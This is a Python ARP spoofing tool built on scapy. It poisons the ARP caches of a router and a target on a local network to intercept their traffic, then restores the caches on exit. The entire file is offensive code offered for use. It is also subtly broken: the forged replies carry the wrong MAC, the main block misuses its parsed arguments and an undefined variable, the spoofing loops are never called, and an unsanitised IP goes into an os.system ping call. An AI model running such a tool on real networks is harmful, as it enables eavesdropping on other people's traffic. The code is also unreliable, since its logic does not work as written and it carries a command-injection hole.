'''import modules'''
try:
    import argparse  #modules for get arguments

    import logging    #modules for Save errors

    import scapy.all as scapy # module for send packet 

    import threading       # Thread Library

    from colorama import Style , Fore , init # message colore (banner ,message )

    import ipaddress  #verify ip input ip address

    import time       # timeout

    import os  #command system

except ImportError  :
    logging.error(f"[-] Error import modules , Try using the command (pip 'name module')")

'''Preparation modules colorama'''
init()

'''Determine the level of errors'''
logging.basicConfig(level=logging.INFO)

'''Function to take input arguments'''
def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tools")
    parser.add_argument("-r","--router",
                        dest="router_ip",
                        required=True,
                        help="Enter range router ip address(1.1.1.1)")
    parser.add_argument("-t",
                        "--target",
                        dest="target_ip",
                        required=True,
                        help="Enter range target ip address (1.1.1.1)")
    
    args = parser.parse_args()    
    return args.router_ip , args.target_ip

'''Function to Print the appearance'''
def banner():
    banner = r"""              
⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣟⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⢻⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿
⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠉⠛⠿⢿⣿⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⠿⠟⠋⠁⠀⢠⣿⣿⣿⣿⣿⣿⣿
⢸⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠈⢙⣻⣿⣿⣷⣦⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⣿⣿⣟⠉⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡿
⠀⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠸⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠈⠻⠿⠿⠿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠿⠿⠿⠋⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⠁⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣤⣤⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""


    print(f"{Fore.RED}{'\t      A R P '}{Style.RESET_ALL} {Fore.GREEN}{' S P O O F I N G'}{Style.RESET_ALL}")
    print(f"{Fore.RED}{banner}{Style.RESET_ALL}") # print banner 
    print(f"\n{Fore.RED}{'-' * 128}{Style.RESET_ALL}\n") 
    print(f"""{Fore.WHITE}Make sure that the target device is connected to the Internet and is on the same network. Use the ping command to make sure.{Style.RESET_ALL}""") #print text
    print(f"\n{Fore.RED}{'-' * 128}{Style.RESET_ALL}\n") 

'''Function to verify ip address'''
def verify_ip(input_ip):
    try:

        ipaddress.ip_network(input_ip , strict=False) # verify ip
        return True
    except ValueError : # except value error
        return False

'''Function verify connection (ping)'''
def ping_target(ip):

    '''command for check connection (ping)'''

    command = os.system(f"ping -c 4 {ip}")

    '''There is a response from the device (0)'''
    if command == 0 :

        print(f"[+] {ip} Connection confirmed (ping successful)")

        '''There not  response from the device'''
    else :

        print(f"[-]Not Response on {ip} (error ping)")


'''Function to get mac address'''
def get_mac(ip):

    result = f"No Response on {ip}"
    try:
        if result:
            arp_request = scapy.ARP(pdst=ip)

            arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

            arp_broadcast_request = arp_broadcast/arp_request

            result = scapy.srp(arp_broadcast_request , timeout=4, verbose=False)[0]
        '''verify value result'''
        if not result:
            logging.error(f"{Fore.RED}[-] NO response on {ip} ,Check device connection{Style.RESET_ALL}")
        '''Get mac address'''
        return result[0][1].hwsrc

    except ValueError as v_r:

        logging.error(f"{Fore.RED}[-] Invaild input detected : {v_r} {Style.RESET_ALL}")  
        '''except error os '''
    except OSError as o_r:
       
        logging.error(f"{Fore.RED}[-] Error on system : {o_r}{Style.RESET_ALL}")    
 
    except Exception as g_r:

        logging.error(f"{Fore.RED}[-] An unexpected error occurred : {g_r}{Style.RESET_ALL} ")
 
'''Function to spoof target / router'''
def spoof(target_ip ,
           spoof_ip):
    '''get mac address for spoofing'''
    target_mac  = get_mac(target_ip)

    spoof_mac  = get_mac(spoof_ip)
    '''verify mac address for target and spoof'''
    if target_mac is None:

        logging.error(f"{Fore.RED}[-] Error getting mac address on {target_ip}{Style.RESET_ALL}")
        return

    if spoof_mac is None:

        logging.error(f"{Fore.RED}[-] Error getting mac address on {spoof_ip}{Style.RESET_ALL}")
        return
    
    try:  
        '''Create  response packet ARP '''
       
        arp_response = scapy.ARP(pdst=target_ip, 
                                 hwdst=target_mac, 
                                   psrc=spoof_ip, 
                                   hwsrc=spoof_mac)

        ethernet = scapy.Ether(dst=target_mac) / arp_response

        scapy.sendp(ethernet , verbose=False)
        
    except ValueError as v_r:

        logging.error(f"{Fore.RED}[-] Invaild input detected : {v_r}{Style.RESET_ALL}") 

    except Exception as e_r:
         
         logging.error(f"{Fore.RED}[-] An unexpected error occurred : {e_r}{Style.RESET_ALL}")
         '''except error os '''
    except OSError as o_r:

        logging.error(f"{Fore.RED}[-] Error on system : {o_r}{Style.RESET_ALL}") 

'''Function to threading '''
def thread(target_ip , spoof_ip):

    try: 
        '''Create thread'''
        spoof_thread = threading.Thread(target=spoof, 
                                  args=(target_ip, spoof_ip))
        
        spoof_thread.daemon = True
        '''start thread'''
        spoof_thread.start()

    except Exception as e_r :

        logging.error(f"{Fore.RED}[-] Error create thread : {e_r}{Style.RESET_ALL}")

'''Function to restore ARP table'''
def restore(target_ip , source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)

    try:

        if target_mac is None:
            logging.error(f"{Fore.RED}[-] Error getting mac address on {target_ip}{Style.RESET_ALL}")
            return
        
        if source_mac is None:
            logging.error(f"{Fore.RED}[-] Error getting mac address on {source_ip}{Style.RESET_ALL}")
            return

        arp_response = scapy.ARP(op=2,
                                  pdst=target_ip,
                                    hwdst=target_mac,
                                      psrc=source_ip,
                                        hwsrc=source_mac) 

        scapy.send(arp_response , count=6, verbose=False) 

    
    except Exception as e_r:

        logging.error(f"{Fore.RED}[-] An unexpected error occurred : {e_r}{Style.RESET_ALL}")

    except ValueError as v_r:

        logging.error(f"{Fore.RED}[-] Invaild input detected : {v_r}{Style.RESET_ALL}")

    except OSError as o_r:

        logging.error(f"{Fore.RED}[-] Error on system : {o_r}{Style.RESET_ALL}")


'''start tools'''
if __name__ == "__main__":
    try:
        banner()
        
        print(f"\n{Fore.YELLOW}[+] Start arp spoofing please wait a moment...{Style.RESET_ALL}\n")

        args = get_arguments()

        router_ip , target_ip = args
        ping_target(args.target_ip)

        if args.router_ip and not verify_ip(args.router_ip):
            logging.error(f"{Fore.RED}[-] invaild router ip , please enter vaild ip address : {v_r}{Style.RESET_ALL} ")

        
        if args.target_ip and not verify_ip(args.target_ip):
            logging.error(f"{Fore.RED}[-] invaild target ip , please enter vaild ip address : {v_r}{Style.RESET_ALL} ")


        def spoof_target():

            while True:

                spoof(target_ip, router_ip)

                print(f"{Fore.GREEN}[+] Packet sent to {target_ip}{Style.RESET_ALL}")

                time.sleep(3)

        def spoof_router():

            while True:

                spoof(router_ip, target_ip)

                print(f"{Fore.GREEN}[+] Packet sent to {router_ip}{Style.RESET_ALL}")
                time.sleep(3)

        thread(target_ip, router_ip)

        thread(router_ip,target_ip)

        while True:
            time.sleep(1)

    except KeyboardInterrupt :

        print(f"{Fore.YELLOW}\n[-] Exiting...\n{Style.RESET_ALL}")

    except Exception as e_r:

        logging.error(f"{Fore.RED}[-] An unexpected error occurred{Style.RESET_ALL}")
    finally :
         
        restore(target_ip, router_ip)
        restore(router_ip, target_ip)
        print(f"{Fore.GREEN}\n[+] ARP table restore succefully on {target_ip} and {router_ip}{Style.RESET_ALL}\n")

           
   